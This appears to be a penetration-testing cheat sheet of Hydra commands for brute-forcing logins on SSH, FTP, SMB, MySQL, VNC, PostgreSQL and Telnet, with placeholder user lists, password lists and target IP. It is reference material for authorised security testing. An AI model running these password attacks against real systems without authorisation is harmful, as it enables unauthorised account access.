# Hydra

% bruteforce, hydra

## Hydra - SSH
```
hydra -L <userlist> -P <passlist> <ip> ssh 
```

## Hydra - FTP
```
hydra -L <userlist> -P <passlist> <ip> ftp 
```

## Hydra - SMB
```
hydra -L <userlist> -P <passlist> <ip> smb
```

## Hydra - MYSQL
```
hydra -L <userlist> -P <passlist> <ip> mysql 
```

## Hydra - VNC
```
hydra -L <userlist> -P <passlist> <ip> vnc 
```

## Hydra - PostgreSQL
```
hydra -L <userlist> -P <passlist> <ip> postgres
```

## Hydra - Telnet
```
hydra -L <userlist> -P <passlist> <ip> telnet 
```

= userlist: users.txt
= passlist: pass.txt
